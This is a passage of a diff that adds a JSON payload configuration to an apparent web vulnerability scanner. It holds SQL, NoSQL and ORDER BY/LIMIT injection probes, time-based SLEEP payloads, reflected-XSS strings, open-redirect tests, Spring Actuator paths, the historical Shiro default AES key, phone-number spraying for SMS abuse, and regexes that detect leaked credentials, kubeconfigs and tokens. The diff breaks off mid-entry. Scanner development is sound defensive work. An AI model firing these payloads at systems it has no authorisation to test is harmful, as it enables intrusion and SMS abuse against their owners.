+          "name": "Spring form _method DELETE",
+          "kind": "form_param",
+          "group": "_method",
+          "payload": "DELETE",
+          "expected": "(?is)(?:deleted|删除成功|\"status\"\\s*:\\s*\"?(?:deleted|success))"
+        },
+        {
+          "name": "Spring multipart _method DELETE",
+          "kind": "multipart_param",
+          "group": "_method",
+          "payload": "DELETE",
+          "expected": "(?is)(?:deleted|删除成功|\"status\"\\s*:\\s*\"?(?:deleted|success))"
+        },
+        {
+          "name": "X-HTTP-Method-Override PUT",
+          "kind": "header",
+          "payload": "PUT",
+          "expected": "(?is)(?:updated|修改成功|更新成功)",
+          "header": "X-HTTP-Method-Override"
+        },
+        {
+          "name": "X-Method-Override PATCH",
+          "kind": "header",
+          "payload": "PATCH",
+          "expected": "(?is)(?:updated|修改成功|更新成功)",
+          "header": "X-Method-Override"
+        }
+      ]
+    },
+    "mybatis_dynamic_sql": {
+      "parameter_names": [
+        "sort",
+        "order",
+        "orderBy",
+        "order_by",
+        "column",
+        "field",
+        "fields",
+        "table",
+        "tableName",
+        "table_name",
+        "groupBy",
+        "group_by",
+        "direction",
+        "queryColumn"
+      ],
+      "payloads": [
+        {
+          "name": "追加不存在排序列",
+          "kind": "fragment_break",
+          "payload": "{{value}},jhs_invalid_column_731",
+          "expected": "jhs_invalid_column_731"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "MySQL 不存在列",
+          "pattern": "(?is)(Unknown column .{0,160}jhs_invalid_column_731|jhs_invalid_column_731.{0,160}(?:unknown column|SQLSyntaxErrorException))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "PostgreSQL 不存在列",
+          "pattern": "(?is)(column .{0,120}jhs_invalid_column_731.{0,80}does not exist|jhs_invalid_column_731.{0,160}PSQLException)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/JDBC 动态 SQL",
+          "pattern": "(?is)(jhs_invalid_column_731.{0,300}(?:BadSqlGrammarException|PersistenceException|SQLSyntaxErrorException|SQLException)|(?:BadSqlGrammarException|PersistenceException|SQLSyntaxErrorException|SQLException).{0,300}jhs_invalid_column_731)",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "nosql_injection": {
+      "payloads": [
+        {
+          "name": "MongoDB 操作符真",
+          "kind": "boolean_true",
+          "group": "mongo-operator",
+          "payload": "{\"$ne\":null}"
+        },
+        {
+          "name": "MongoDB 操作符假",
+          "kind": "boolean_false",
+          "group": "mongo-operator",
+          "payload": "{\"$eq\":\"__jhs_no_match_731__\"}"
+        },
+        {
+          "name": "MongoDB 语法错误",
+          "kind": "error_probe",
+          "payload": "{\"$where\":\"jungle_happy_scan(\"}"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "MongoDB/BSON 异常",
+          "pattern": "(?is)(MongoServerError|MongoQueryException|MongoCommandException|BsonInvalidOperationException|BSONTypeError|unknown operator.{0,80}\\$|invalid operator.{0,80}\\$|bad query|Failed to parse.*Mongo)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "Elasticsearch 查询异常",
+          "pattern": "(?is)(x_content_parse_exception|parsing_exception|query_shard_exception|ElasticsearchStatusException|unknown query \\[[^\\]]+\\])",
+          "severity": "high",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "open_redirect": {
+      "parameter_names": [
+        "redirect",
+        "return",
+        "next",
+        "continue",
+        "target",
+        "url",
+        "callback"
+      ],
+      "payloads": [
+        {
+          "name": "外部 HTTPS",
+          "payload": "https://jungle-happy-scan.invalid/{{token}}"
+        }
+      ]
+    },
+    "parameter_confusion": {},
+    "path_normalization": {},
+    "reflected_xss": {
+      "payloads": [
+        {
+          "name": "HTML 文本",
+          "kind": "html-text",
+          "payload": "{{token}}\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        },
+        {
+          "name": "属性上下文",
+          "kind": "attribute",
+          "payload": "{{token}}\"\u003e\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        },
+        {
+          "name": "双引号属性上下文",
+          "kind": "attribute-double",
+          "payload": "{{token}}\"\u003e\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        },
+        {
+          "name": "单引号属性上下文",
+          "kind": "attribute-single",
+          "payload": "{{token}}'\u003e\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        },
+        {
+          "name": "无引号属性上下文",
+          "kind": "attribute-unquoted",
+          "payload": "{{token}}\u003e\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        },
+        {
+          "name": "脚本单引号字符串",
+          "kind": "script-single",
+          "payload": "{{token}}';confirm(\"{{token}}\");//"
+        },
+        {
+          "name": "脚本双引号字符串",
+          "kind": "script-double",
+          "payload": "{{token}}\";confirm(\"{{token}}\");//"
+        },
+        {
+          "name": "脚本模板字符串",
+          "kind": "script-template",
+          "payload": "{{token}}`;confirm(\"{{token}}\");//"
+        },
+        {
+          "name": "脚本代码上下文",
+          "kind": "script-code",
+          "payload": "{{token}};confirm(\"{{token}}\");//"
+        },
+        {
+          "name": "兼容旧配置的脚本上下文",
+          "kind": "script",
+          "payload": "{{token}}';confirm(\"{{token}}\");//"
+        },
+        {
+          "name": "标签上下文",
+          "kind": "tag",
+          "payload": "{{token}}\u003e\u003csvg/onload=confirm(\"{{token}}\")\u003e"
+        }
+      ]
+    },
+    "sensitive_data": {
+      "patterns": [
+        {
+          "name": "Java 异常堆栈",
+          "pattern": "(?m)(?:^|\\n)\\s*at\\s+[a-zA-Z_$][\\w$]*(?:\\.[\\w$]+)+\\([^\\n]+\\.java:\\d+\\)",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "SQL 语句",
+          "pattern": "(?is)\\b(?:select\\s+.{1,200}?\\s+from|insert\\s+into|update\\s+\\w+\\s+set|delete\\s+from)\\b.{0,300}",
+          "severity": "medium",
+          "confidence": "firm"
+        },
+        {
+          "name": "数据库连接串",
+          "pattern": "(?i)jdbc:(?:mysql|postgresql|gaussdb|opengauss|oracle|h2):[^\\s\"']+",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "私钥",
+          "pattern": "-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
+          "severity": "critical",
+          "confidence": "certain"
+        },
+        {
+          "name": "JWT",
+          "pattern": "\\beyJ[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\b",
+          "severity": "medium",
+          "confidence": "certain"
+        },
+        {
+          "name": "Linux 绝对文件路径",
+          "pattern": "(?:/[a-zA-Z0-9_.-]+){4,}",
+          "severity": "low",
+          "confidence": "firm"
+        },
+        {
+          "name": "中国大陆手机号",
+          "pattern": "(?:^|\\D)(1[3-9]\\d{9})(?:\\D|$)",
+          "severity": "medium",
+          "confidence": "firm"
+        },
+        {
+          "name": "中国身份证号",
+          "pattern": "(?:^|\\D)(\\d{17}[0-9Xx])(?:\\D|$)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "银行卡号",
+          "pattern": "(?:^|\\D)(\\d{13,19})(?:\\D|$)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "邮箱地址",
+          "pattern": "(?i)(?:^|[^A-Z0-9._%+-])([A-Z0-9._%+-]{1,64}@[A-Z0-9.-]+\\.[A-Z]{2,63})(?:[^A-Z0-9._%+-]|$)",
+          "severity": "medium",
+          "confidence": "firm"
+        },
+        {
+          "name": "IP 地址",
+          "pattern": "(?:^|[^0-9])((?:25[0-5]|2[0-4]\\d|1?\\d?\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1?\\d?\\d)){3})(?:[^0-9]|$)",
+          "severity": "low",
+          "confidence": "certain"
+        },
+        {
+          "name": "Kubernetes Kubeconfig 凭据",
+          "pattern": "(?is)((?:apiVersion:\\s*v1.{0,1000}kind:\\s*Config\\b|kind:\\s*Config\\b.{0,1000}apiVersion:\\s*v1).{0,1000}(?:client-certificate-data|client-key-data|token):\\s*[^\\s]+)",
+          "severity": "critical",
+          "confidence": "certain"
+        },
+        {
+          "name": "Kubernetes Secret 清单",
+          "pattern": "(?is)(kind:\\s*Secret\\b.{0,800}(?:data|stringData):\\s*(?:\\r?\\n\\s+[A-Za-z0-9_.-]+:\\s*[^\\s]+)+)",
+          "severity": "critical",
+          "confidence": "certain"
+        },
+        {
+          "name": "Kubernetes ServiceAccount 凭据路径",
+          "pattern": "(?i)(KUBERNETES_SERVICE_HOST|/var/run/secrets/kubernetes\\.io/serviceaccount/(?:token|namespace|ca\\.crt))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "Docker Registry 认证信息",
+          "pattern": "(?is)(\"auths\"\\s*:\\s*\\{.{0,1000}\"auth\"\\s*:\\s*\"[A-Za-z0-9+/=]{8,}\")",
+          "severity": "critical",
+          "confidence": "certain"
+        },
+        {
+          "name": "Docker 认证环境变量",
+          "pattern": "(?is)(DOCKER_AUTH_CONFIG\\s*[=:]\\s*['\"]?\\{.{0,1000}\"auth\"\\s*:)",
+          "severity": "critical",
+          "confidence": "certain"
+        },
+        {
+          "name": "Docker Socket 路径",
+          "pattern": "(?i)((?:unix://)?/var/run/docker\\.sock)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "微信小程序 AppSecret",
+          "pattern": "(?is)(?:\\\"?(?:appsecret|appsecrect|app_secret|wx_app_secret|wechat_app_secret)\\\"?\\s*[:=]\\s*\\\"?)([A-Za-z0-9_-]{16,64})",
+          "severity": "critical",
+          "confidence": "certain"
+        }
+      ]
+    },
+    "shiro": {
+      "payloads": [
+        {
+          "name": "Shiro 历史默认 AES Key",
+          "kind": "key",
+          "payload": "kPH+bIxk5D2deZiIxcaaaA=="
+        }
+      ]
+    },
+    "sms_abuse": {
+      "parameter_names": [
+        "mobile",
+        "mobileNo",
+        "mobilePhone",
+        "phone",
+        "phoneNumber",
+        "telephone",
+        "tel",
+        "smsPhone",
+        "receiverMobile"
+      ],
+      "url_keywords": [
+        "send"
+      ],
+      "payloads": [
+        {
+          "name": "喷洒号码 1",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7300"
+        },
+        {
+          "name": "喷洒号码 2",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7301"
+        },
+        {
+          "name": "喷洒号码 3",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7302"
+        },
+        {
+          "name": "喷洒号码 4",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7303"
+        },
+        {
+          "name": "喷洒号码 5",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7304"
+        },
+        {
+          "name": "喷洒号码 6",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7305"
+        },
+        {
+          "name": "喷洒号码 7",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7306"
+        },
+        {
+          "name": "喷洒号码 8",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7307"
+        },
+        {
+          "name": "喷洒号码 9",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7308"
+        },
+        {
+          "name": "喷洒号码 10",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7309"
+        },
+        {
+          "name": "喷洒号码 11",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7310"
+        },
+        {
+          "name": "喷洒号码 12",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7311"
+        },
+        {
+          "name": "喷洒号码 13",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7312"
+        },
+        {
+          "name": "喷洒号码 14",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7313"
+        },
+        {
+          "name": "喷洒号码 15",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7314"
+        },
+        {
+          "name": "喷洒号码 16",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7315"
+        },
+        {
+          "name": "喷洒号码 17",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7316"
+        },
+        {
+          "name": "喷洒号码 18",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7317"
+        },
+        {
+          "name": "喷洒号码 19",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7318"
+        },
+        {
+          "name": "喷洒号码 20",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7319"
+        },
+        {
+          "name": "喷洒号码 21",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7320"
+        },
+        {
+          "name": "喷洒号码 22",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7321"
+        },
+        {
+          "name": "喷洒号码 23",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7322"
+        },
+        {
+          "name": "喷洒号码 24",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7323"
+        },
+        {
+          "name": "喷洒号码 25",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7324"
+        },
+        {
+          "name": "喷洒号码 26",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7325"
+        },
+        {
+          "name": "喷洒号码 27",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7326"
+        },
+        {
+          "name": "喷洒号码 28",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7327"
+        },
+        {
+          "name": "喷洒号码 29",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7328"
+        },
+        {
+          "name": "喷洒号码 30",
+          "kind": "spray_number",
+          "payload": "{{prefix}}7329"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "短信发送成功",
+          "pattern": "(?is)(短信.{0,20}(?:发送|下发).{0,20}成功|验证码.{0,20}(?:发送|下发).{0,20}成功|\"(?:code|status)\"\\s*:\\s*\"?(?:0|200|000000)\"?|\"(?:success|successful)\"\\s*:\\s*true)",
+          "severity": "high",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "spring_actuator": {
+      "paths": [
+        "/actuator",
+        "/actuator/health",
+        "/actuator/env",
+        "/actuator/beans",
+        "/actuator/configprops",
+        "/actuator/mappings",
+        "/actuator/loggers",
+        "/actuator/threaddump",
+        "/actuator/conditions",
+        "/actuator/scheduledtasks",
+        "/actuator/caches",
+        "/actuator/prometheus",
+        "/actuator/httptrace",
+        "/actuator/flyway",
+        "/actuator/liquibase",
+        "/actuator/gateway/routes",
+        "/actuator/jolokia",
+        "/management",
+        "/management/env",
+        "/management/mappings",
+        "/druid/index.html",
+        "/druid/login.html",
+        "/h2-console",
+        "/jolokia",
+        "/springbootadmin",
+        "/applications"
+      ]
+    },
+    "sqli": {
+      "payloads": [
+        {
+          "name": "单引号破坏",
+          "kind": "error_break",
+          "group": "quote",
+          "payload": "{{value}}'"
+        },
+        {
+          "name": "双引号恢复",
+          "kind": "error_repair",
+          "group": "quote",
+          "payload": "{{value}}''"
+        },
+        {
+          "name": "拼接单引号破坏",
+          "kind": "error_break",
+          "group": "quote-concat-empty",
+          "payload": "{{value}}'"
+        },
+        {
+          "name": "空字符串拼接恢复",
+          "kind": "error_repair",
+          "group": "quote-concat-empty",
+          "payload": "{{value}}'||''||'"
+        },
+        {
+          "name": "PostgreSQL/GaussDB 条件正常分支",
+          "kind": "conditional_control",
+          "group": "postgres-exp-string",
+          "payload": "{{value}}'||(CASE WHEN 1=1 THEN '' ELSE exp(720::float8)::text END)||'"
+        },
+        {
+          "name": "PostgreSQL/GaussDB 条件溢出分支",
+          "kind": "conditional_error",
+          "group": "postgres-exp-string",
+          "payload": "{{value}}'||(CASE WHEN 1=2 THEN '' ELSE exp(720::float8)::text END)||'"
+        },
+        {
+          "name": "MySQL/PostgreSQL/GaussDB 通用条件正常分支",
+          "kind": "conditional_control",
+          "group": "portable-exp-string",
+          "payload": "{{value}}' AND (CASE WHEN 1=1 THEN 731 ELSE EXP(720) END)=731-- "
+        },
+        {
+          "name": "MySQL/PostgreSQL/GaussDB 通用条件溢出分支",
+          "kind": "conditional_error",
+          "group": "portable-exp-string",
+          "payload": "{{value}}' AND (CASE WHEN 1=2 THEN 731 ELSE EXP(720) END)=731-- "
+        },
+        {
+          "name": "MySQL 条件正常分支",
+          "kind": "conditional_control",
+          "group": "mysql-exp-string",
+          "payload": "{{value}}' AND IF(731=731,731,EXP(720))=731-- "
+        },
+        {
+          "name": "MySQL 条件溢出分支",
+          "kind": "conditional_error",
+          "group": "mysql-exp-string",
+          "payload": "{{value}}' AND IF(731=732,731,EXP(720))=731-- "
+        },
+        {
+          "name": "数值布尔真",
+          "kind": "boolean_true",
+          "group": "numeric",
+          "payload": "{{value}} AND 731=731"
+        },
+        {
+          "name": "数值布尔假",
+          "kind": "boolean_false",
+          "group": "numeric",
+          "payload": "{{value}} AND 731=732"
+        },
+        {
+          "name": "字符串布尔真",
+          "kind": "boolean_true",
+          "group": "and-string",
+          "payload": "{{value}}' AND '731'='731"
+        },
+        {
+          "name": "字符串布尔假",
+          "kind": "boolean_false",
+          "group": "and-string",
+          "payload": "{{value}}' AND '731'='732"
+        },
+        {
+          "name": "LIKE 包裹字符串布尔真",
+          "kind": "boolean_true",
+          "group": "like-wrapped-string",
+          "payload": "{{value}}%' AND '731'='731' AND '%'='"
+        },
+        {
+          "name": "LIKE 包裹字符串布尔假",
+          "kind": "boolean_false",
+          "group": "like-wrapped-string",
+          "payload": "{{value}}%' AND '731'='732' AND '%'='"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "PostgreSQL/JDBC 异常",
+          "pattern": "(?is)(org\\.postgresql\\.util\\.PSQLException|postgresql.{0,100}(?:error|exception)|PSQLException|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}|unterminated quoted string|syntax error at or near|invalid input syntax for (?:type|integer|numeric|uuid)|operator does not exist.{0,100}|column .{0,80} does not exist)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "GaussDB JDBC/内核异常",
+          "pattern": "(?is)(GaussDB(?:\\s+Kernel)?.{0,120}(?:ERROR|Exception)|com\\.huawei\\.gauss200\\.jdbc|org\\.opengauss\\.util\\.PSQLException|openGauss.{0,120}(?:ERROR|Exception)|GS-[0-9]{5}|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}.{0,180}(?:gauss|openGauss)|(?:gaussdb|opengauss).{0,180}(?:syntax error|invalid input syntax|column .{0,80} does not exist))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MySQL/JDBC 异常",
+          "pattern": "(?is)(com\\.mysql\\.(?:cj\\.)?jdbc\\.(?:exceptions\\.)?(?:MySQLSyntaxErrorException|MysqlDataTruncation|StatementImpl)|MySQLSyntaxErrorException|You have an error in your SQL syntax|check the manual that corresponds to your MySQL server version|Unknown column .{0,100} in|Truncated incorrect .{0,80} value|XPATH syntax error:)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/Spring 数据访问异常",
+          "pattern": "(?is)(org\\.apache\\.ibatis\\.exceptions\\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\\s*Error (?:querying|updating) database|#{3}\\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\\.xml)|java\\.sql\\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "存储过程/CallableStatement 异常",
+          "pattern": "(?is)(CallableStatement.{0,120}(?:Exception|error)|callable statement.{0,120}(?:failed|error)|stored procedure.{0,120}(?:error|exception)|bad SQL grammar.{0,180}(?:call|CallableStatement))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "通用 SQL 语法异常",
+          "pattern": "(?is)(SQL syntax.{0,120}|SQLSTATE\\[|bad SQL grammar|syntax error.{0,100}(?:SQL|query)|database error|query failed)",
+          "severity": "high",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "sqli_extended": {
+      "payloads": [
+        {
+          "name": "双引号标识符破坏",
+          "kind": "error_break",
+          "group": "double-quote",
+          "payload": "{{value}}\""
+        },
+        {
+          "name": "双引号标识符恢复",
+          "kind": "error_repair",
+          "group": "double-quote",
+          "payload": "{{value}}\"\""
+        },
+        {
+          "name": "括号上下文布尔真",
+          "kind": "boolean_true",
+          "group": "parenthesis",
+          "payload": "{{value}}) AND (731=731"
+        },
+        {
+          "name": "括号上下文布尔假",
+          "kind": "boolean_false",
+          "group": "parenthesis",
+          "payload": "{{value}}) AND (731=732"
+        },
+        {
+          "name": "数字注释上下文布尔真",
+          "kind": "boolean_true",
+          "group": "numeric-comment",
+          "payload": "{{value}} AND 731=731-- "
+        },
+        {
+          "name": "数字注释上下文布尔假",
+          "kind": "boolean_false",
+          "group": "numeric-comment",
+          "payload": "{{value}} AND 731=732-- "
+        },
+        {
+          "name": "字符串注释上下文布尔真",
+          "kind": "boolean_true",
+          "group": "string-comment",
+          "payload": "{{value}}' AND 731=731-- "
+        },
+        {
+          "name": "字符串注释上下文布尔假",
+          "kind": "boolean_false",
+          "group": "string-comment",
+          "payload": "{{value}}' AND 731=732-- "
+        },
+        {
+          "name": "双引号字符串布尔真",
+          "kind": "boolean_true",
+          "group": "double-quote-string",
+          "payload": "{{value}}\" AND \"731\"=\"731"
+        },
+        {
+          "name": "双引号字符串布尔假",
+          "kind": "boolean_false",
+          "group": "double-quote-string",
+          "payload": "{{value}}\" AND \"731\"=\"732"
+        },
+        {
+          "name": "数值 OR 基线对照",
+          "kind": "boolean_true",
+          "group": "or-numeric-control",
+          "payload": "{{value}} OR 731=732"
+        },
+        {
+          "name": "数值 OR 真条件探针",
+          "kind": "boolean_false",
+          "group": "or-numeric-control",
+          "payload": "{{value}} OR 731=731"
+        },
+        {
+          "name": "字符串 OR 基线对照",
+          "kind": "boolean_true",
+          "group": "or-string-control",
+          "payload": "{{value}}' OR '731'='732"
+        },
+        {
+          "name": "字符串 OR 真条件探针",
+          "kind": "boolean_false",
+          "group": "or-string-control",
+          "payload": "{{value}}' OR '731'='731"
+        },
+        {
+          "name": "PostgreSQL CAST 错误",
+          "kind": "error_break",
+          "group": "postgres-cast",
+          "payload": "{{value}} AND CAST('jhs731' AS INTEGER)=731"
+        },
+        {
+          "name": "PostgreSQL CAST 对照",
+          "kind": "error_repair",
+          "group": "postgres-cast",
+          "payload": "{{value}} AND CAST('731' AS INTEGER)=731"
+        }
+      ],
+      "patterns": [
+        {
+          "name": "PostgreSQL/JDBC 异常",
+          "pattern": "(?is)(org\\.postgresql\\.util\\.PSQLException|postgresql.{0,100}(?:error|exception)|PSQLException|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}|unterminated quoted string|syntax error at or near|invalid input syntax for (?:type|integer|numeric|uuid)|operator does not exist.{0,100}|column .{0,80} does not exist)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "GaussDB JDBC/内核异常",
+          "pattern": "(?is)(GaussDB(?:\\s+Kernel)?.{0,120}(?:ERROR|Exception)|com\\.huawei\\.gauss200\\.jdbc|org\\.opengauss\\.util\\.PSQLException|openGauss.{0,120}(?:ERROR|Exception)|GS-[0-9]{5}|SQLSTATE\\s*[:\\[]\\s*(?:22|23|42|P0)[0-9A-Z]{3}.{0,180}(?:gauss|openGauss)|(?:gaussdb|opengauss).{0,180}(?:syntax error|invalid input syntax|column .{0,80} does not exist))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MySQL/JDBC 异常",
+          "pattern": "(?is)(com\\.mysql\\.(?:cj\\.)?jdbc\\.(?:exceptions\\.)?(?:MySQLSyntaxErrorException|MysqlDataTruncation|StatementImpl)|MySQLSyntaxErrorException|You have an error in your SQL syntax|check the manual that corresponds to your MySQL server version|Unknown column .{0,100} in|Truncated incorrect .{0,80} value|XPATH syntax error:)",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "MyBatis/Spring 数据访问异常",
+          "pattern": "(?is)(org\\.apache\\.ibatis\\.exceptions\\.PersistenceException|MyBatisSystemException|BadSqlGrammarException|UncategorizedSQLException|DataIntegrityViolationException|#{3}\\s*Error (?:querying|updating) database|#{3}\\s*Cause:.{0,180}(?:SQLException|PSQLException|MySQLSyntaxErrorException)|The error may exist in .{0,180}(?:Mapper|\\.xml)|java\\.sql\\.(?:SQLSyntaxErrorException|SQLException)|JDBC.{0,100}(?:Exception|error))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "存储过程/CallableStatement 异常",
+          "pattern": "(?is)(CallableStatement.{0,120}(?:Exception|error)|callable statement.{0,120}(?:failed|error)|stored procedure.{0,120}(?:error|exception)|bad SQL grammar.{0,180}(?:call|CallableStatement))",
+          "severity": "high",
+          "confidence": "certain"
+        },
+        {
+          "name": "通用 SQL 语法异常",
+          "pattern": "(?is)(SQL syntax.{0,120}|SQLSTATE\\[|bad SQL grammar|syntax error.{0,100}(?:SQL|query)|database error|query failed)",
+          "severity": "high",
+          "confidence": "firm"
+        }
+      ]
+    },
+    "sqli_limit": {
+      "parameter_names": [
+        "limit",
+        "offset",
+        "pageSize",
+        "pageNo",
+        "page",
+        "start",
+        "startRow",
+        "rowStart",
+        "rowCount",
+        "size"
+      ],
+      "payloads": [
+        {
+          "name": "MySQL LIMIT 单引号破坏",
+          "kind": "error_break",
+          "group": "mysql-limit-comment",
+          "payload": "{{value}}'-- "
+        },
+        {
+          "name": "MySQL LIMIT 注释恢复",
+          "kind": "error_repair",
+          "group": "mysql-limit-comment",
+          "payload": "{{value}}-- "
+        },
+        {
+          "name": "PostgreSQL/GaussDB LIMIT/OFFSET 异常分支",
+          "kind": "error_break",
+          "group": "postgres-gauss-limit-cast",
+          "payload": "({{value}} + CAST(CASE WHEN 731=732 THEN '0' ELSE 'jhs731' END AS INTEGER))"
+        },
+        {
+          "name": "PostgreSQL/GaussDB LIMIT/OFFSET 正常分支",
+          "kind": "error_repair",
+          "group": "postgres-gauss-limit-cast",
+          "payload": "({{value}} + CAST(CASE WHEN 731=731 THEN '0' ELSE 'jhs731' END AS INTEGER))"
+        }
+      ]
+    },
+    "sqli_order_by": {
+      "parameter_names": [
+        "sort",
+        "sortBy",
+        "sortField",
+        "sortColumn",
+        "sortKey",
+        "order",
+        "orderBy",
+        "orderField",
+        "orderColumn",
+        "field",
+        "column",
+        "direction"
+      ],
+      "payloads": [
+        {
+          "name": "MySQL ORDER BY 字段条件正常分支",
+          "kind": "conditional_control",
+          "group": "mysql-order-field-exp",
+          "payload": "IF(731=731,{{value}},EXP(720))"
+        },
+        {
+          "name": "MySQL ORDER BY 字段条件溢出分支",
+          "kind": "conditional_error",
+          "group": "mysql-order-field-exp",
+          "payload": "IF(731=732,{{value}},EXP(720))"
+        },
+        {
+          "name": "MySQL ORDER BY 方向条件正常分支",
+          "kind": "conditional_control",
+          "group": "mysql-order-direction-exp",
+          "payload": "{{value}},IF(731=731,1,EXP(720))"
+        },
+        {
+          "name": "MySQL ORDER BY 方向条件溢出分支",
+          "kind": "conditional_error",
+          "group": "mysql-order-direction-exp",
+          "payload": "{{value}},IF(731=732,1,EXP(720))"
+        },
+        {
+          "name": "MySQL ORDER BY 字段零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-order-field-sleep",
+          "payload": "IF(731=731,{{value}},SLEEP(0))",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL ORDER BY 字段2秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-order-field-sleep",
+          "payload": "IF(731=732,{{value}},SLEEP(2))",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL ORDER BY 方向零延迟对照",
+          "kind": "time_control",
+          "group": "mysql-order-direction-sleep",
+          "payload": "{{value}},IF(731=731,1,SLEEP(0))",
+          "expected": "2"
+        },
+        {
+          "name": "MySQL ORDER BY 方向2秒延迟",
+          "kind": "time_delay",
+          "group": "mysql-order-direction-sleep",
+          "payload": "{{value}},IF(731=732,1,SLEEP(2))",
+          "expected": "2"
+        },
+        {
+          "name": "PostgreSQL/GaussDB ORDER BY 字段正常分支",
+          "kind": "conditional_control",
+          "group": "postgres-gauss-order-field-cast",
+          "payload": "{{value}},CAST(CASE WHEN 731=731 THEN '1' ELSE 'jhs731' END AS INTEGER)"
+        },
+        {
+          "name": "PostgreSQL/GaussDB ORDER BY 字段异常分支",
+          "kind": "conditional_error",
+          "group": "postgres-gauss-order-field-cast",
+          "payload": "{{value}},CAST(CASE WHEN 731=732 THEN '1' ELSE 'jhs731' END AS INTEGER)"
+        },
+        {
+          "name": "PostgreSQL/GaussDB ORDER BY 方向正常分支",
+          "kind": "conditional_control",
+          "group": "postgres-gauss-order-direction-cast",
+          "payload": "{{value}},CAST(CASE WHEN 731=731 THEN '1' ELSE 'jhs731' END AS INTEGER)"
+        },
+        {
+          "name": "PostgreSQL/GaussDB ORDER BY 方向异常分支",
+          "kind": "conditional_error",
+          "group": "postgres-gauss-order-direction-cast",
+          "payload": "{{value}},CAST(CASE WHEN 731=732 THEN '1' ELSE 'jhs731' END AS INTEGER)"
+        }
+      ]
+    },
+    "sqli_timing": {
+      "payloads": [
+        {
+          "name": "PostgreSQL 零延迟对照",
+          "kind": "time_control",
+          "group": "postgres-pg-sleep-and",
+          "payload": "{{value}} AND (SELECT 731 FROM pg_sleep(0))=731",
+          "expected": "2"
+        },
+        {
+          "name": "PostgreSQL 2秒延迟",
+          "kind": "time_delay",
+          "group": "postgres-pg-sleep-and",
+          "payload": "{{value}} AND (SELECT 731 FROM pg_sleep(2))=731",
+          "expected": "2"
+        },
+        {
+          "name": "PostgreSQL 字符串零延迟对照",
+          "kind": "time_control",
+          "group": "postgres-pg-sleep-string",
+          "payload": "{{value}}' AND (SELECT 731 FROM pg_sleep(0))=731-- ",
+          "expected": "2"
+        },
+        {
